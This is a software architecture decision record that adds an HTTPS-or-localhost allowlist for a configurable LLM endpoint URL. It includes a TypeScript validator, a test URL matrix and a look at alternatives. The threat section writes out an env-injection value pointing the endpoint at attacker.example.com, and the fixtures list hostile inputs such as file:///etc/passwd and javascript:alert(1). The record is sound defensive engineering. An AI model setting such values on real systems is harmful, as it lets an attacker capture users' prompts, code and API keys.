---
id: "adr-011"
phase: 3
agent: Architect
status: Accepted
created: "2026-04-24"
updated: "2026-04-24"
version: "1.0.0"
approved_by: "Samuel Combey"
approval_date: "2026-04-24"
upstream_refs:
  - specs/architecture.md
dependencies:
  - architecture
risk_level: medium
owners:
  - Samuel Combey
sha256: null
---

# ADR-011: LLM Endpoint Validation — `LITELLM_BASE_URL` HTTPS-or-Localhost Allowlist

> **Status:** Accepted · **Date:** 2026-04-24 · **Decision Maker:** The Architect

---

## Context

`bin/lib/llm-provider.js` uses the OpenAI SDK with a configurable `baseURL` sourced from `process.env.LITELLM_BASE_URL` (defaulting to `http://localhost:4000`). v1.1.14 performs **no validation** on this URL.

**Attack vector**: a malicious actor who can inject environment variables (via a compromised `.env` file in a monorepo, a CI config, or a user-facing shell injection) can set `LITELLM_BASE_URL=https://attacker.example.com/intercept` — redirecting every LLM call from the user's session. Prompt content (which may include sensitive code), system prompts, and any API keys in headers flow through the attacker's proxy.

Pit Crew QA Security Audit SEC-004: **MEDIUM severity** (requires env injection, which is a prerequisite attack step — but a real one given multi-repo / CI setups).

---

## Decision

**`src/llm/provider.ts` MUST validate `LITELLM_BASE_URL` at startup against an allowlist:**

```typescript
import { LLMError } from "../errors.js";

const ALLOWED_ENDPOINT_PATTERNS = [
  /^https:\/\/[^/]+(\/.*)?$/,                          // Any HTTPS URL
  /^http:\/\/localhost(:\d+)?(\/.*)?$/,                // http://localhost:*
  /^http:\/\/127\.0\.0\.1(:\d+)?(\/.*)?$/,             // http://127.0.0.1:*
  /^http:\/\/\[::1\](:\d+)?(\/.*)?$/,                  // http://[::1]:*
];

function validateLLMEndpoint(url: string): void {
  const override = process.env.JUMPSTART_ALLOW_INSECURE_LLM_URL === "1";
  const matches = ALLOWED_ENDPOINT_PATTERNS.some((re) => re.test(url));

  if (matches) return;

  const message =
    `LLM endpoint "${url}" is not HTTPS and not a localhost address. ` +
    `This could indicate environment-variable poisoning. ` +
    `Set JUMPSTART_ALLOW_INSECURE_LLM_URL=1 to override (NOT recommended for production use).`;

  if (override) {
    console.error(`[WARN] ${message} [override in effect]`);
    return;
  }

  throw new LLMError({
    provider: "unknown",
    model: "unknown",
    retryable: false,
    exitCode: 3,
    message,
  });
}
```

**Call site**: `createLLMProvider()` in `src/llm/provider.ts` invokes `validateLLMEndpoint(baseURL)` at construction time. Subsequent LLM calls do not re-validate (one-time startup check).

**Override escape hatch**: `JUMPSTART_ALLOW_INSECURE_LLM_URL=1` bypasses the check with a stderr warning. Legitimate use cases:
- A user running a local LiteLLM proxy on a non-standard IP (e.g., a shared lab machine at `10.0.0.50:4000`).
- CI environments where the proxy is on a private network.

The override is **explicit opt-in** — not a silent flag. Samuel's documentation (T6.4 upgrade doc) documents this as a security-conscious decision.

**Test fixtures** (Turn 2):
- `tests/fixtures/security/llm-endpoint/` with URL matrix:
  - `https://litellm.example.com` → pass
  - `https://api.openai.com` → pass
  - `http://localhost:4000` → pass
  - `http://127.0.0.1:4000` → pass
  - `http://evil.example.com` → fail (non-HTTPS, non-localhost)
  - `http://evil.example.com` + `JUMPSTART_ALLOW_INSECURE_LLM_URL=1` → warn + pass
  - `ftp://example.com` → fail (non-HTTP protocol)
  - `file:///etc/passwd` → fail (non-HTTP protocol)
  - `javascript:alert(1)` → fail (non-HTTP protocol)

---

## Consequences

### Positive
- Closes a MEDIUM-severity env-injection vector against the LLM provider.
- Override flag lets legitimate non-standard setups proceed with explicit user acknowledgment.
- Startup-time check: fail-fast behavior; no LLM calls leak prompts before the invalid endpoint is caught.

### Negative
- Any user running a non-localhost HTTP proxy (not common, but possible) must explicitly opt in via env var.
- URL regex-based validation has edge cases: IPv6 literals (`[::1]`), unusual ports, Unicode hostnames. The regex list above covers the common cases; Punycode hostnames would need explicit handling if that emerges as a real case.

### Neutral
- The `openai@6.x` SDK is unchanged; `baseURL` override API untouched — validation happens at our wrapper.

---

## Alternatives Considered

### Always require HTTPS (no localhost exception)
- **Description:** Only `https://*` URLs accepted; force localhost users to configure TLS.
- **Pros:** Simpler policy.
- **Cons:** Breaks LiteLLM's default `http://localhost:4000` out-of-the-box setup. Every developer getting started has to configure TLS first.
- **Reason Rejected:** Unacceptable DX for the local-development path that the framework targets.

### No validation; rely on user to configure safely
- **Description:** Current v1.1.14 behavior.
- **Pros:** Zero change.
- **Cons:** Leaves the medium-severity attack vector open indefinitely.
- **Reason Rejected:** The point of SEC-004 is to close this.

### Validate via DNS / network reachability
- **Description:** Require the endpoint to resolve to a known-safe address range before accepting it.
- **Pros:** Stronger check.
- **Cons:** Adds network I/O at startup; DNS is itself spoofable; over-engineered for the threat model.
- **Reason Rejected:** URL-shape check is proportionate to the attack.

---

## References

- [specs/architecture.md ADR-011 + §Security SEC-004](../architecture.md#specific-high-severity-mitigations-per-pit-crew-qa-security-audit-integrated-turn-1)
- Pit Crew QA Security Audit Part 2 Finding 6 (MEDIUM severity)
- [specs/implementation-plan.md T4.3.1 LLM cluster port](../implementation-plan.md#stage-43--llm--state--ux-clusters-30-modules)
- LiteLLM proxy documentation (Context7 re-verify confirmed baseURL override support)
